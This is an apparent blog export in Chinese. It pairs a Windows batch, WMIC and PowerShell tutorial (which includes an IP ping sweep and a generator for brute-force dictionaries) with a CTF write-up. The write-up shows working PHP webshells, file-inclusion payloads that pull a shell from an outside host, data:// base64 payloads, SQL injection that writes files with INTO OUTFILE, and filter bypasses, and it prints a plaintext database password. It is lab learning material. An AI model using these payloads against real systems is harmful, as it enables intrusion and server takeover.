设置控制台前景和背景颜色 pause 暂停 goto 跳转，与:配对使用 if 条件判断 for 循环 call 调用（另一个批处理文件或者:label标签） errorlevel 程序返回码，用于判断上条命令是否成功（S:0、F:1） choice 选择。让用户输入一个字符，从而运行不同的命令，不常用。CHOICE /C YNC /M IF EXIST 判断文件是否存在。类似：IF NOT EXIST setlocal 设置环境变量和变量延迟 endlocal 与setlocal成对出现，用来对批处理执行过程中的环境变量进行临时修改和操作 start 调用外部程序的命令 date和time 日期和时间 BAT特殊符号： 关键字 说明 @ 回显屏蔽，隐藏它后面这一行的命令本身（只能影响当前行） % 批处理变量引导符，标识引用参数（行内注释） ！ 设置变量延迟时，用来表示变量 &gt;、&gt;&gt;、&lt;、&lt;&amp;、&gt;&amp; 重定向符 &amp;、&amp;&amp;、\ \ 组合命令符 \ 管道命令符 “” 字符串界定符 ^ 转义符 , 相当于空格 ; 当命令相同时，可以将不同目标用;来隔离 () 号中可以包括多行命令，这些命令将被看成一个整体，视为一条命令行（左右括号必须成对使用） + 命令文件连接符，如：copy xxx+xxx : 标识标签（标签长度不能超过8个字节） / 参数开关引导符 *、? 通配符 :: 注释符 = 赋值符号 == 等于 EQU 等于（==） NEQ 不等于 LSS 小于 LEQ 小于或等于 GTR 大于 GEQ 大于或等于 BAT系统变量： 参数 值 %SystemRoot% %windir% C:\WINDOWS %ProgramFiles% C:\Program Files %USERPROFILE% C:\Documents and Settings\Administrator %ALLUSERSPROFILE% C:\Documents and Settings\All Users %APPDATA% C:\Documents and Settings\Administrator\Application Data %ComSpec% C:\WINDOWS\system32\cmd.exe %OS% Windows_NT %Path% %SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem %HOMEDRIVE% C: %HOMEPATH% \Documents and Settings\Administrator %TEMP% %TMP% C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp %SystemDrive% C: %LOGONSERVER% \机器名（\hostname） %USERNAME% Administrator %COMPUTERNAME% 机器名（hostname） %CommonProgramFiles% C:\Program Files\Common Files %USERDOMAIN% 所属域（机器名） %PATHEXT% .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH 在目录里输入set命令，会显示出全部系统变量 BAT颜色表： 值 颜色 值 颜色 0 黑色 8 灰色 1 蓝色 9 浅蓝色 2 绿色 A 浅绿色 3 湖蓝色 B 淡浅绿色 4 红色 C 淡灰色 5 紫色 D 淡紫色 6 黄色 E 淡黄色 7 白色 F 亮白色 BAT中for命令：基本格式： 1FOR %%variable IN (set) DO command [command-parameters] 参数 说明 %%variable 指定一个单一字母表示可替换的参数 (set) 指定一个或一组文件。可以使用通配符 command 指定对每个文件执行的命令 command-parameters 为特定命令指定参数或命令行开关 参数： FOR有四个参数：/d /l /r /f BAT中FOR /D参数： /D 指定与目录名匹配，而不与文件名匹配 例子： 123@echo offfor /d %%i in (c:\*) do echo %%ipause 输出C盘根目录下所有文件夹 另一例子： 123@echo offfor /d %%i in (??????) do echo %%ipause 输出所有目录名 还有一例子： 123@echo offfor /D %%a in (*e* *i*) do echo %%apause 输出名字里包含i或者e的目录 BAT中FOR /R参数： /R 检查以 [drive:]path 为根目录的目录树 FOR /R [[drive:]path] %%variable IN (set) DO command [command-parameters] 例子： 123@echo offfor /r C:\bpms %%i in (*.exe) do echo %%ipause 输出C:\bpms目录里所有.exe结尾的文件 又一例子： 123@echo offfor /r %%c in (*) do (echo %%c)pause 输出所有东西 BAT中FOR /L参数： /L 表示以增量形式从开始到结束的一个数字序列 FOR /L %variable IN (start,step,end) DO command [command-parameters] 例子： 123@echo offfor /l %%i in (1,1,5) do echo %%ipause 输出1-5 又一例子： 123@echo offfor /l %%i in (1,1,3) do start calcpause 弹出三次计算器应用 BAT中FOR /F参数： /F 表示迭代及文件解析 FOR /F [“options”] %variable IN (file-set) DO command [command-parameters]FOR /F [“options”] %variable IN (“string”) DO command [command-parameters]FOR /F [“options”] %variable IN (“command”) DO command [ommand-parameters] options参数 说明 eol=c 指一个行注释字符的结尾(就一个) skip=n 指在文件开始时忽略的行数。 delims=xxx 指分隔符集。这个替换了空格和制表符的默认分隔符集。 tokens=x,y,m-n 指每行的哪一个符号被传递到每个迭代的 for 本身。这会导致额外变量名称的分配。m-n格式为一个范围。通过 nth 符号指定 mth。如果符号字符串中的最后一个字符星号，那么额外的变量将在最后一个符号解析之后分配并接受行的保留文本。 usebackq 指定新语法已在下类情况中使用:在作为命令执行一个后引号的字符串并且一个单引号字符为文字字符串命令并允许在 file-set中使用双引号扩起文件名称。 例子： 12345678910@echo offrem 首先建立临时文件test.txtecho ;注释行,这是临时文件,用完删除 &gt;test.txtecho 11段 12段 13段 14段 15段 16段 &gt;&gt;test.txtecho 21段,22段,23段,24段,25段,26段 &gt;&gt;test.txtecho ;31段+32段+33段+34段+35段+36段&gt;&gt;test.txtecho 41段-42段-43段-44段-45段-46段 &gt;&gt;test.txtFOR /F &quot;eol=; tokens=1,3* delims=,- &quot; %%i in (test.txt) do echo %%i %%j %%kPauseDel test.txt 命令行输出内容（因为分号后面的内容不被输出）： 12345C:\Users\Administrator\Desktop&gt;test.bat11段 12段 13段 14段 15段 16段21段 23段 24段,25段,26段41段-42段-43段-44段-45段-46段请按任意键继续. . . 创建的文本内容（去掉代码里的delete语句才能看到）： 12345;注释行，这是临时文件，用完删除 11段 12段 13段 14段 15段 16段 21段,22段,23段,24段,25段,26段 ;31段+32段+33段+34段+35段+36段41段-42段-43段-44段-45段-46段 例子二： 123@echo offFOR /F &quot;eol= delims=&quot; %%i in (test.txt) do echo %%ipause 输出内容： 1234567C:\Users\Administrator\Desktop&gt;test.bat;注释行，这是临时文件，用完删除11段 12段 13段 14段 15段 16段21段,22段,23段,24段,25段,26段31段+32段+33段+34段+35段+36段41段-42段-43段-44段-45段-46段请按任意键继续. . . 例子三（注意delims=后面有一个空格）： 123@echo offFOR /F &quot;eol= delims= &quot; %%i in (test.txt) do echo %%ipause 输出内容： 1234567C:\Users\Administrator\Desktop&gt;test.bat;注释行，这是临时文件，用完删除11段21段,22段,23段,24段,25段,26段31段+32段+33段+34段+35段+36段41段-42段-43段-44段-45段-46段请按任意键继续. . . 意思是分隔符集为空格 例子四： 123@echo offFOR /F &quot;eol=; tokens=1,2,3 delims=,- &quot; %%i in (test.txt) do echo %%i %%j %%kpause 输出内容： 12345C:\Users\Administrator\Desktop&gt;test.bat11段 12段 13段21段 22段 23段41段 42段 43段请按任意键继续. . . 解释下： 12tokens=1,2,3 是指输出每行第一二三个delims=,- 是指只有当分隔符为减号或空格时才遵守上面的输出规则 例子五： 1234567@echo offfor /f &quot;tokens=1,2,3 delims=- &quot; %%a in (&apos;date /t&apos;) do ( echo %%a echo %%b echo %%c)pause 输出结果： 1234C:\Users\Administrator\Desktop&gt;test.bat2017/11/15周三请按任意键继续. . . 例子六： 12345678@echo off@echo offfor /f &quot;skip=2 tokens=1,2,3 delims= &quot; %%i in (&apos;net user&apos;) do ( echo %%i echo %%j echo %%k)pause 输出结果为： 1234567C:\Users\Administrator\Desktop&gt;test.bat----------------------------------------AdministratorGuesttest命令成功完成。请按任意键继续. . . 例子七： 123@echo offfor /f &quot;skip=5 tokens=4&quot; %%a in (&apos;dir&apos;) do echo %%apause 输出结果： 12345678&lt;DIR&gt;&lt;DIR&gt;2,709275,436117字节可用字节请按任意键继续. . . 和输入命令dir后显示的字节数信息相同 123456789101112 驱动器 C 中的卷没有标签。 卷的序列号是 C017-6D30 C:\Users\Administrator\Desktop\Linux 的目录2017/09/09 周六 20:59 &lt;DIR&gt; .2017/09/09 周六 20:59 &lt;DIR&gt; ..2017/07/26 周三 11:31 2,709 1.txt2017/09/09 周六 21:00 275,436 Linux Security Coaching.xmind2017/07/13 周四 21:58 117 linux学习.txt 3 个文件 278,262 字节 2 个目录 42,868,559,872 可用字节 BAT中FOR /F变量拓展： %~I -删除任何引号(“),拓展%I%~fI -将%I拓展到一个完全合格的路径名%~dI -仅将%I拓展到一个驱动器号%~pI -仅将%I拓展到一个路径%~nI -仅将%I拓展到一个文件名%~xI -仅将%I拓展到一个文件拓展名%~sI -拓展的路径只含有短名%~aI -将%I拓展到文件的文件属性%~tI -将%I拓展到文件的日期/时间%~zI -将%I拓展到文件的大小%~$PATH:I -查找列在路径环境变量的目录,并将%I拓展到找到的第一个完全合格的名称.如果环境变量名未被定义,或者没找到文件,此组合键会拓展到空字符串%~dpI -仅将%I拓展到一个驱动器号和路径%~nxI -仅将%I拓展到一个文件名和拓展名%~fsI -仅将%I拓展到一个带有短名的完整路径名%~dp$PATH:I -搜索列在路径环境变量的目录,并将%I拓展到找到的第一个驱动器号和路径%~ftzaI -将%I拓展到类似输出线路的DIR 说明:%~sI中%~s为语法,I为变量​ %~dpI中%~dp为语法,I为变量 BAT中FOR /F变量拓展%~I： 例子: 1234567891011@echo offrem 建立临时文件rem 不成对的引号要加转义字符^rem 重定向符号前不要留空格echo ^&quot;1111&gt;temp.txtecho &quot;2222&quot;&gt;&gt;temp.txtecho 3333^&quot;&gt;&gt;temp.txtecho &quot;4444&quot;44&gt;&gt;temp.txtecho ^&quot;55&quot;55&quot;55&gt;&gt;temp.txtfor /f &quot;delims=&quot; %%i in (temp.txt) do echo %%~ipause 输出内容： 123456111122223333&quot;4444&quot;4455&quot;55&quot;55请按任意键继续. . . 创建的文本内容为： 12345&quot;1111&quot;2222&quot;3333&quot;&quot;4444&quot;44&quot;55&quot;55&quot;55 规则： 12341.若字符串首位同时存在引号,则删除首尾的引号;2.若字符串尾不存在引号,则删除字符串首的引号;3.如果字符串中间存在引号,或者只在尾部存在引号,则不删除总结:无头不删除,有头连尾删 BAT中FOR /F变量拓展%~FI： 例子: 123@echo offfor /f &quot;delims=&quot; %%i in (&apos;dir /b&apos;) do @echo %%ipause 输出内容：打印出所有文件包括文件夹 例子二： 123@echo offfor /f &quot;delims=&quot; %%i in (&apos;dir /b&apos;) do @echo %%~fipause 输出内容：和上面一样，不过会把文件的绝对路径打印出来 BAT中FOR /F变量拓展%~SI： 例子： 123@echo offfor /f &quot;delims=&quot; %%i in (&apos;dir /b&apos;) do @echo %%~sipause 输出内容：打印出短文件名 例二： 123@echo offfor /f &quot;delims=&quot; %%i in (&quot;calc.exe&quot;) do @echo %%~$PATH:ipause 输出结果，打开计算器 在PATH变量里指定的路径里搜索calc.exe文件，如果有calc.exe，则会把他所在的绝对路径打印出来，没有就打印一个错误。如果将包裹calc.exe的双引号改为单引号，当搜索是有calc.exe存在时，则会打开这个应用 BAT字符串处理：1.字符串分割格式: %源字符串:~起始值,截取长度% 说明:1.起始值从0开始2.截取长度可选,如果省略逗号和截取长度值,将会从头截到尾3.截取长度如果是负数,表示截取倒数第几个 举例： “%time%” 显示如:”09:10:23.03”(完整的时间”hh:mm:ss:tt”)“%time:~0,5%” 显示”hh:mm”(即:”11:04”),其中0表示从右向左移位操作的个数,5表示从左向右移位操作的个数“%time:~0,8%” 显示标准时间格式”hh:mm:ss”(即”11:04:23”，前8个字符串)“%time:~3,-3%”显示”mm:ss”(即从第4个开始,截去最后3个的字符串)“%time:~3%” 显示”04:23.03”(即去掉前4个字符串)“%time:~-3%” 显示”.tt”(即最后3个字符串) 2.字符串替换: 1234set a=&quot;abcd1234&quot;echo %a% 显示：&quot;abcd1234&quot;set a=%a:1=kk% 替换&quot;1&quot;为&quot;kk&quot;echo %a% 显示：&quot;abcdkk234&quot; 3.字符串合并： 1set str1=%str1%%str2% （合并str1和str2） 4.统计字符串长度： 1234567891011@echo offset testStr=This is a test stringset str=%testStr%:next1if not &quot;%str%&quot;==&quot;&quot; (set /a num+=1set &quot;str=%str:~1%&quot;goto next1)echo testStr=%testStr%echo testStr的长度为：%num% 输出结果： 12testStr=This is a test stringtestStr的长度为：21 5.截取字符串时，需要传递参数： 12setlocal enabledelayedexpansionecho !args:~%num%,-5! BAT简单脚本实例：例一:自定义变量: 123@echo offset var=MyValueecho %var% 输出内容： 1MyValue 例二：用户输入变量值： 1234@echo offset /p var=请输入变量的值：echo %var%pause 输出内容： 123请输入变量的值：testtest请按任意键继续. . . 例三：未设置变量延迟： 1234@echo offset a=4set a=5 &amp; echo %a%pause 输出内容： 14 例四：设置变量延迟： 12345@echo offsetlocal enabledelayedexpansionset a=4set a=5 &amp; echo !a!pause 输出内容： 15 什么是延迟环境变量？ 1延迟环境变量，顾名思义，延迟读取了环境变量。当我们开启延迟环境变量之后，命令解释器就不再是运行命令前先将环境变量读取出来再执行，而是当我们用到延迟环境变量的时候再去从环境变量中读取出来，这就延迟了环境变量读取的时间。 例五：读取文件第一行： 1234@echo offset /p str=&lt;%0echo %str%pause 输出内容： 12@echo off请按任意键继续. . . 例六：标签的使用： 12345@echo offset var=0if %var% neq 1 goto labelecho It&apos;s label:label 输出空白，因为neq是等于的意思 例七：if倒叙循环： 12345678910@echo offset var=100rem Start:contecho 第%var%次循环set /a var-=1if %var% gtr 0 goto contrem Endecho Donepause 倒叙循环输出一百次，因为gtr是大于的意思 例八：简单for循环： 12345@echo offfor /l %%i in (1,1,100) do ( echo %%i)pause 输出内容，1-100，因为（1,1,100）的意思是从1到100，自加一 BAT实现ping某IP段并统计存活IP个数： 1234567891011121314151617181920212223242526272829303132333435@echo offpushd %SystemDrive%\setlocal ENABLEDELAYEDEXPANSIONset online=0set offline=0set /a Total=0set log=ping.txtfor /L %%a in (0,1,255) do (set temp=0set ifonline=Offlineset /a Total+=1set tmpIP=222.18.127.%%a for /f &quot;delims=&quot; %%i in (&apos;ping -n 1 -w 100 !tmpIP!&apos;) do ( for %%x in (%%i) do ( if %%x == TTL ( set ifonline=Online set /a online+=1 set temp=1 ) ) ) if /i !temp! EQU 0 ( @echo !tmpIP! !ifonline! @echo !tmpIP! !ifonline! &gt;&gt; !log! ) else ( echo !tmpIP! ****** !ifonline! echo !tmpIP! ****** !ifonline! &gt;&gt; !log! )echo Scan Host :!tmpIP! Completed)set /a offline =Total -onlineecho Total Computers : !Total! &gt;&gt; !log!echo Online Computers : !online! &gt;&gt; !log!echo Offline Computers : !offline! &gt;&gt; !log!popd 输出结果： 1234567Scan Host :222.18.127.107 Completed222.18.127.108 OfflineScan Host :222.18.127.108 Completed222.18.127.109 OfflineScan Host :222.18.127.109 Completed222.18.127.110 Offline...... 文本ping.txt内容： 1234567891011222.18.127.0 Offline 222.18.127.1 Offline 222.18.127.2 Offline 222.18.127.3 Offline 222.18.127.4 Offline 222.18.127.5 Offline 222.18.127.6 Offline 222.18.127.7 Offline 222.18.127.8 Offline 222.18.127.9 Offline ...... BAT生成特定格式数实例： 12345678910111213141516171819@echo offsetlocal ENABLEDELAYEDEXPANSIONif &quot;%1%&quot; NEQ &quot;&quot; ( set ch=%1%) else ( set /p ch Input figures(1-9^):)set ten=1set max_num=9for /L %%a in (1,1,%ch%) do ( set /a ten*=10)set /a max_num=!ten!-1title Create number 0~!max_num!for /L %%i in (0,1,!max_num!) do ( set tempnum=!ten!%%i echo !tempnum:~-%ch%!&gt;&gt;0-!max_num!.txt)echo Done! 这个可以用来生成爆破字典 WMI命令：概念： WMIC扩展WMI，提供了从命令接口和批命令脚本执行系统管理的支持。用户可以使用WMI管理本地和远程计算机 WMIC： WMI命令行工具 作用： 在远程计算机上启动一个进程​ 设定一个在特定日期和时间运行的进程​ 远程启动计算机​ 获得本地或远程计算机的已安装程序列表​ 查询本地或远程计算机的windows事件日志 先决条件： 12启动WMI服务，开启TCP135端口本地安全策略的“网络访问:本地账户的共享和安全模式”应设为“经典-本地用户以自己的身份验证” WMIC语法：语法1：WMIC别名： 12wmic processwmic service 语法2：WMIC 别名 where 属性=“属性值”： 123wmic process where caption=&quot;calc.exe&quot;wmic 别名 where 属性=”属性值“ call 方法wmic process where caption=&quot;calc.exe&quot; call delete 语法3：WMIC 别名 call 方法 参数： 1wmic process call create calc 语法4：WMIC /node:远程主机 /user:用户名 /password:密码 语句： 123wmic /node:dc /user:admin /password:123456 processwmic /node:dc /user:admin /password:123456 process where caption=&quot;taskmgr.exe&quot; deletewmic /node:dc /user:admin /password:123456 process call create clac wmic /node:222.18.127.41 /user:Administrator /password:6721 process WMIC实例：1.连接到某节点： 1wmic /node:&quot;ip&quot; /user:&quot;用户名&quot; /password:&quot;密码&quot; 自己本地连接直接输入wmic命令即可 2.硬件管理： 获取硬盘资料： 1DISKDRIVE get deviceid,Caption,size,InterfaceType 获取分区资料： 1LOGICALDISK get name,Description,filesystem,size,freespace 获取CPU资料: 1cpu get name,addresswidth,processorid 获取主板资料: 1BaseBoard get Manufacturer,Product,Version,SerialNumber 获取内存数: 1memlogical get totalphysicalmemory 获得品牌机的序列号: 1csproduct get IdentifyingNumber 获取声卡资料: 1SOUNDDEV get ProductName 获取屏幕分辨率: 1DESKTOPMONITOR where Status=&apos;ok&apos; get ScreenHeight,ScreenWidth 3.进程管理——process 列出进程： 1process list brief （full显示所有，brief显示摘要，instance显示实例，status显示状态） 获取进程路径： 1process where name=&quot;cmd.exe&quot; get executablepath 创建新进程： 123process call create notepadprocess call create &quot;c:\windows\system32\cmd.exe&quot;process call create &quot;shutdown.exe -r -f -t 20&quot; 会重启，小心 删除指定进程： 123process where name=&quot;cmd.exe&quot; call terminateprocess where processid=&quot;123&quot; deleteprocess 123 call terminate 删除可疑进程： 12process where &quot;name=&apos;explorer.exe&apos; and executablepath&lt;&gt;&apos;%systemdrive%\\windows\\explorer.exe&apos;&quot; deleteprocess where &quot;name=&apos;svchost.exe&apos; and executablepath&lt;&gt;&apos;c:\\windows\\system32\\svchost.exe&apos;&quot; call terminate 4.账号管理——useraccount 更改当前用户名： 12useraccount where &quot;name=&apos;%username%&apos;&quot; call rename newnameuseraccount create /? 5.共享管理——share: 建立共享： 12share call create &quot;&quot;,&quot;test&quot;,&quot;3&quot;,&quot;TestShareName&quot;,&quot;&quot;,&quot;c:\test&quot;,0（可使用share call create /? 查看create后的参数类型） 删除共享： 12share where name=&quot;C$&quot; call deleteshare where path=&apos;c:\\test&apos; delete 6.服务管理——service: 更改telnet服务自动启动类型[auto|disabled|manual] 1service where name=&quot;tlntsvr&quot; set startmode=&quot;auto&quot; 运行telnet服务： 1service where name=&quot;tlntsvr&quot; call startservice 停止ICS服务： 1service where name=&quot;shardaccess&quot; call stopservice 删除test服务： 1service where name=&quot;test&quot; call delete 7.目录管理——fsdir： 列出C盘下名为test的目录： 1fsdir where &quot;drive=&apos;c:&apos; and filename=&apos;test&apos;&quot; list 删除c:\test文件夹 1fsdir &quot;c:\\test&quot; call delete 重命名c:\test文件夹为abc 12fsdir &quot;c:\\test&quot; rename &quot;c:\abc&quot;fsdir where (name=&apos;c:\\test&apos;) rename &quot;c:\abc&quot; 复制文件夹： 1fsdir where name=&apos;d:\\test&apos; call copy &quot;c:\\test&quot; 8.任务计划——job： 1job call create &quot;notepad.exe&quot;,0,0,true,false,********14800.000000+480 9.设置ip——nicconfig： 配置或更新ip地址： 1nicconfig where index=0 call enablestatic(&quot;192.168.1.5&quot;),(&quot;255.255.255.0&quot;) 说明：index=0说明是配置网络接口1 配置网关（默认路由）： 1nicconfig where index=0 call setgateways(&quot;192.168.1.1&quot;) 10.计算机系统管理——computersystem 查看系统启动选项，boot的内容 1computersystem get systemstartupoptions 查看工作组/域 1computersystem get domain 更改计算机名abc为123 1computersysterm where &quot;name=&apos;abc&apos;&quot; call rename 123 更改工作组workgroup为MyGroup 1computersystem where &quot;name=&apos;workgroup&apos;&quot; call joindomainorworkgroup &quot;&quot;,&quot;&quot;,&quot;MyGroup&quot;,1 文件管理——datafile： 重命名 1datafile &quot;c:\\test.txt&quot; call rename c:\abc.txt 查找e盘下test目录（不包括子目录）下的cc.cmd文件 1datafile where &quot;drive=&apos;e:&apos; and path=&apos;\\test\\&apos; and filename=&apos;cc&apos; and extension=&apos;cmd&apos;&quot; list 查找e盘下所有目录和子目录下的cc.cmd文件，且文件大小大于1k 1datafile where &quot;drive=&apos;e:&apos; and filename=&apos;cc&apos; and extension=&apos;cmd&apos; and filesize&gt;&apos;1000&apos;&quot; list 删除e盘下文件大小大于10M的.cmd文件 1datafile where &quot;drive=&apos;e:&apos; and extension=&apos;cmd&apos; and filesize&gt;&apos;10000000&apos;&quot; call delete 删除e盘下test目录（不包括子目录）下的非.cmd文件 1datafile where &quot;drive=&apos;e:&apos; and extension&lt;&gt;&apos;cmd&apos; and path=&apos;test&apos;&quot; call delete 复制e盘下test目录（不包括子目录）下的cc.cmd文件到e:\，并改名为aa.bat 1datafile where &quot;drive=&apos;e:&apos; and path=&apos;\\test\\&apos; and filename=&apos;cc&apos; and extension=&apos;cmd&apos;&quot; call copy &quot;e:\aa.bat&quot; 重命名c:\hello.txt为c:\test.txt 1datafile &quot;c:\\hello.txt&quot; call rename c:\test.txt 查找h盘下目录含有test，文件名含有perl，后缀为txt的文件 1datafile where &quot;drive=&apos;h:&apos; and extension=&apos;txt&apos; and path like &apos;%\\test\\%&apos; and filename like &apos;%perl%&apos;&quot; get name POWERSHELL：概念： Powershell是运行在windows机器上实现系统和应用程序管理自动化的命令行脚本环境 支持平台： win7及以上。powershell需要.NET环境的支持，同时支持.NET对象 教程： http://www.pstips.net/powershell-online-tutorials/ 实例： 将数据写入文件 1ac 123.txt abc 打开123.txt，文件内容为abc 读取文件 12cat 123.txtcat 123.txt -t 5 读取前5行 清屏 1cls clear-host 清空文件 1clear-content 1.txt 列举子项 12dir c:\dir hklm:\software 显示帮助 1help ac 列进程 1get-process 生成随机数 1random -maximum 10 -minimum 5 列服务 1get-service 获取当前路径 1pwd 指定等待的时间 1sleep 5 等待进程结束 1wait-process -id 1000 结束进程 1stop-process -id 1000 停止服务 1stop-servie -name server 路还很长]]></content>
      <tags>
        <tag>windows</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实验班小组出题WP]]></title>
    <url>%2F2017%2F11%2F14%2F%E5%AE%9E%E9%AA%8C%E7%8F%AD%E5%B0%8F%E7%BB%84%E5%87%BA%E9%A2%98WP%2F</url>
    <content type="text"><![CDATA[本地文件包含：第一关：首先查看源码，发现有提示：1234&lt;--@cmd=$_GET['cmd'];@include($cmd);--&gt; 随便上传文件试试，先上传一个txt，发现没反应，再试试jpg文件，发现alert出路径了。 初步思路：上传一张带木马的图片，然后菜刀连接getshell。 建立一个txt文件，文件内容为：1234&lt;?php@eval($_POST['67']);echo 'test';?&gt; 改后缀为jpg上传。 接着访问：1http://222.18.158.233:2501/www/image/1.jpg 404，想到是包含漏洞，所以修改路径：1http://222.18.158.233:2501/upload/index.php?cmd=www/image/1.jpg 还是不对，估计路径还是不对，试试../相对路径：1http://222.18.158.233:2501/upload/index.php?cmd=../image/1.jpg 菜刀连接getshell 第二关：查看源码：12345&lt;--@$cmd=$_GET['cmd'];@$cmd=str_replace('../','',$cmd);@include($cmd);--&gt; 过滤了../，并且还是过滤成空了，双写直接绕过getshell 第三关：查看源码：12345&lt;--@$cmd=$_GET['cmd'];@$cmd=str_replace('../','',$cmd);@include($cmd,'.php');--&gt; 看来被强制转化为php文件了，想到用00截断失败，估计版本较高（php 版本&lt;5.3.4 有效）。 在网上看到过一篇博客，用phar://协议和zip协议拿到shell：1http://blog.ourren.com/2015/03/16/phar_include_exploit/ 直接贴步骤：liu.php（一句话木马）=》liu.zip=》liu.jpg=》上传，构造：1http://222.18.158.233:2503/upload/index.php?cmd=phar://..././image/liu.jpg/liu 连接菜刀成功Get shell。 之前压缩成rar文件，一直连接不成功，后来改成zip成功了，还没搞清楚为何这样 顺便贴出zip://协议的构造：1http://222.18.158.233:2503/upload/index.php?cmd=zip://....//image/liu.jpg%23liu 总结：学习了phar://和zip://姿势 远程文件包含：第一关：发现右上角有隐藏的提示cmd参数。查看源码，发现有个链接：1http://67.216.200.194/shell.txt 访问是一个一句话木马，直接连接菜刀吧：1http://222.18.158.233:777/challenge/?cmd=http://67.216.200.194/shell.txt flag在index.php源码。 第二关：这里可以试试data://伪协议:1http://222.18.158.233:778/challenge/?cmd=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+ 发现phpinfo()函数被执行了，说明这个思路可以利用。那么就直接写入一句话木马吧：1http://222.18.158.233:778/challenge/?cmd=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWyc2NyddKTtlY2hvICJ0ZXN0Ijs/Pg== 成功输出test，连接菜刀getshell。 SQL字符型注入：第一关：题目tips：1flag由两部分组成，一个是拿到webshell后在网站根目录，另一个要在管理员页面以正确的管理员账号密码登录后弹窗，两个前后组成一起就是flag的base64编码 一开始还以为是直接注入，flag和管理员账号密码都在数据库里，注入后发现只有几个用户名密码。 看来必须写入shell了，在注入点构造：1uname=1&amp;passwd=1&apos; union select 1,&apos;&lt;?php @eval($_POST[&quot;67&quot;]); echo &quot;test&quot;;?&gt;&apos; into outfile &apos;/var/www/html/7.php&apos;#&amp;submit=Submit 写入路径要注意，不然会没有写入权限。我之前问某大佬一道sql注入题的时候，大佬直接查看源文件拿flag，他说常玩docker就知道这个路径了，是个小技巧。 OK写入成功后访问：1http://222.18.158.233:2001/var/www/html/7.php 显示404，用../和../../也是一样。 于是用御剑扫，扫出了：1http://222.18.158.233:2001/7.php 访问输出了test，然后连接菜刀查看根目录拿到一半flag，但是没找到管理员账号密码，而且管理员登陆界面是404，那就直接在后台找flag吧。 第二关：题目tips：12增加了过滤。。。。。emmm别想对bypass管理员的验证 尝试发现过滤了空格，用%a0绕过。但是上传的一句话木马不能执行，推测是还过滤了某些关键字或者&lt;&gt;之类的吧。用hex编码绕过，上传连接菜刀getshell。 但是不像第一关，后台没有另外一半flag。倒是发现了两个好玩的东西。一个是py脚本，作用大概是定时重置数据库的。另一个是一个路由规则的txt文件。 txt文件：12localhost:80-&gt;192.168.126.132:1002-&gt;222.18.158.233:2002localhost:3306-&gt;192.168.126.132:1010-&gt;222.18.158.233:2010 3306端口转发，所以可以远程连接数据库（数据库账号密码在后台能看到）：1mysql -h 222.18.158.233 -P 2010 -u level2 -pKuriyama_Mirai 连接到数据库后查看管理员账号密码，发现就是源码里的那个，但是密码是MD5加密。修改试试，还是不能以管理员身份登陆。 后来问了下出题人才知道，修改密码后MD5加密后再update就可以了，可惜了，没想到这点 另外有一点，第二关的admin.php里有一段代码： 1include_once('http://172.17.0.2/level2/flag.php'); 说明开启了allow_url_include=On，有远程文件包含漏洞，可以用load_file直接读取源码 还有一点，正则里的.*可以用\n绕过 第三关:放出了过滤文件的源码： 123456789101112131415161718192021222324&lt;?phpfunction filter($input)&#123; while(preg_match('/(and|or|union|where|limit|group by|select|hex|substr)/i',$input))&#123; $input=preg_replace('/(and|or|union|where|limit|group by|select|hex|substr)/i','',$input); &#125; $array=array("*"," ","-","0x"); foreach($array as $str)&#123; $input=str_replace($str,"",$input); &#125; return $input;&#125;function filter_add($input)&#123; $filter=preg_match('/(select.*into)|(limit [0-9]+,[0-9]+)/i',$input); if($filter)&#123; die("&lt;script&gt;alert(\"emmmm...want to have a webshell?.\")&lt;/script&gt;"); &#125;&#125;function filter_admin($input)&#123; preg_match("/^[_0-9a-z]&#123;4,25&#125;$/i",$input) or die("&lt;script&gt;alert(\"Emmmmm...Your input is out of range or containing illegal parameter.\")&lt;/script&gt;");&#125;?&gt; 以为是出题人温（丧）暖（心）人（病）心（狂）的wp： 在filter函数中，敏感字符串和特殊符号分开进行了过滤，先检查敏感字符串再替换特殊符号为空，仔细思考会发现其存在逻辑漏洞，可以在敏感字符串中插入特殊字符绕过敏感字符串检测，过滤特殊字符后变成正常语句，空格过滤可以用%0a、反引号或者\n绕过，然后就可以进行正常的注入爆数据等，爆出管理员账号密码，密码是多次base64加密的密文，python脚本跑一遍就能得到明文。登陆取得一半flag。 另一半需写入shell在上级目录读文件获得，在这里用正则过滤了“select into outfile”写shell的方式，但是正则写得不对……被大佬用\n和%0a绕过，这里本来是想让大家了解一下利用“terminated by”写shell的方式，在sqlmap目录下有个写shell的payload： 1LIMIT 0,1 INTO OUTFILE &apos;%OUTFILE%&apos; LINES TERMINATED BY 0x%HEXSTRING%-- 与前者稍微不同的是，这个是在查询出数据后在数据中插入我们的一句话木马，因此写shell时前面需能正确查询一条或多条数据，具体可看这篇文章：http://www.cnblogs.com/qing123/p/6771858.html 在后台有一个python脚本会扫生成的shell文件并检测其中的敏感字符串代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344import osimport reimport timedir_list=["admin.php","index.php","sql","filter.php","filter.php.bak"]dir_list2=["sql-con-1.php","sql-con-2.php","sql-con-3.php"]str="emmmm,your shell is detected"while(1): dir=os.listdir("html/") if len(dir) != len(dir_list): for i in dir: if i not in dir_list: if os.path.isfile("html/%s" % i): dir_list.append(i) file=open("html/%s" % i,'r') try: content=file.read() content=content.lower() result=re.search("eval|assert|post|include|require|;",content) if result != None: print('shell found') file.close() file=open("html/%s" % i,'w') file.write(str) finally: file.close() elif os.path.isdir("html/%s" % i): dir2=os.listdir("html/%s/" % i) for j in dir2: if j not in dir_list2: file = open("html/%s/%s" % (i,j), 'r') try: content = file.read() content=content.lower() result = re.search("eval|assert|include|post|require|;", content) if result != None: print('shell found') file.close() file = open("html/%s/%s" % (i,j), 'w') file.write(str) finally: file.close() time.sleep(5) 过滤了eval、assert、post，等关键词，以及分号，同学可以写入免杀且隐蔽的一句话，然后因为检测脚本会sleep 5s，因此也可以通过脚本或者burp在被遍历修改前访问到，想要同学们熟悉的是只有$_GET的shell： 1&lt;?php $_GET[a]($_GET[b])?&gt; 当a=assert时，后面可以执行一句话php代码，因此可以url传参a=assert&amp;b=system(‘cat ../flag.txt’)的方式读到flag，通过拿到第二题后wget或者第三题用load_file可以读到admin源码，可以发现我把密码加密函数文件放到了另外一台docker容器中，并通过远程包含的方式包含include进来： 